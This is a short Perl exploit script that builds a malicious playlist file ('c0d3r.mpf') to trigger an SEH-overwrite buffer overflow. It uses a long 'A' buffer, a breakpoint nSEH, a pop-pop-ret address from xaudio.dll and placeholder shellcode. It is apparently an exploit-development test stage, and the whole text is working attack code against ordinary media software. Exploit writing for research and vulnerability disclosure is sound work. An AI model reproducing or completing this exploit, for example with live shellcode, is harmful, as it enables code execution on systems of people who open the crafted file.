my $totalsize=5005;
my $sploitfile="c0d3r.mpf";
my $junk = "http://";
$junk=$junk."A" x 4105;
my $nseh="\xcc\xcc\xcc\xcc";  # Breakpoint, sploit should stop here
my $seh=pack('V',0x10015087); # pop pop ret from xaudio.dll
my $shellcode="A123456789B123456789C123456789D123456789";
my $junk2="D"x($totalsize-length($junk.$nseh.$seh));
my $payload=$junk.$nseh.$seh.$shellcode.$junk2;

# Writing Payload to File
print " [+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;close (myfile);
print " [+] File written\n";
print " [+] " . length($payload)." bytes\n";

